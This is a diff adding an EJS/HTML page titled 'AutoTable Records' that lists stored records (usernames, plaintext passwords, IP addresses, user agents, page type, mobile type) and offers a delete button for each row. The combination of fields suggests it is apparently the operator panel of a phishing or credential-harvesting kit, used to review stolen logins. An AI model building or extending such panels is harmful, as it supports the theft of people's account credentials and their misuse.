@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Auto Table Data</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a2e; color: #eee; }
+    h2 { text-align: center; color: #00d4ff; }
+    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+    th, td { padding: 10px 12px; border: 1px solid #333; text-align: left; font-size: 13px; }
+    th { background: #16213e; color: #00d4ff; position: sticky; top: 0; }
+    tr:nth-child(even) { background: #0f3460; }
+    tr:nth-child(odd) { background: #1a1a2e; }
+    tr:hover { background: #e94560; color: #fff; }
+    .count { text-align: center; color: #aaa; margin-top: 10px; }
+    .refresh { display: block; margin: 15px auto; padding: 8px 20px; background: #00d4ff; border: none; color: #000; font-weight: bold; cursor: pointer; border-radius: 4px; }
+  </style>
+</head>
+<body>
+  <h2>AutoTable Records</h2>
+  <button class="refresh" onclick="location.reload()">Refresh</button>
+  <p class="count">Total: <%= rows.length %> records</p>
+  <script>
+    function deleteRow(id) {
+      if (!confirm('Delete this row?')) return;
+      fetch('/datatable/delete/' + id, { method: 'POST' })
+        .then(r => r.json())
+        .then(data => { if (data.ok) document.getElementById('row-' + id).remove(); });
+    }
+  </script>
+  <table>
+    <thead>
+      <tr>
+        <th>ID</th>
+        <th>Username</th>
+        <th>Password</th>
+        <th>IP</th>
+        <th>User Agent</th>
+        <th>Date</th>
+        <th>Page Type</th>
+        <th>Mobile Type</th>
+        <th>Remarks</th>
+      </tr>
+    </thead>
+    <tbody>
+      <% rows.forEach(row => { %>
+      <tr id="row-<%= row.id %>">
+        <td><%= row.id %></td>
+        <td><%= row.username %></td>
+        <td><%= row.password %></td>
+        <td><%= row.ip %></td>
+        <td><%= row.useragent %></td>
+        <td><%= row.date ? new Date(row.date).toLocaleString() : '' %></td>
+        <td><%= row.pagetype %></td>
+        <td><%= row.mobiletype %></td>
+        <td><button onclick="deleteRow(<%= row.id %>)" style="background:#2ecc71;color:#fff;border:none;padding:5px 12px;cursor:pointer;border-radius:3px;">Delete</button></td>
+      </tr>
+      <% }) %>
+    </tbody>
+  </table>
+</body>
+</html>
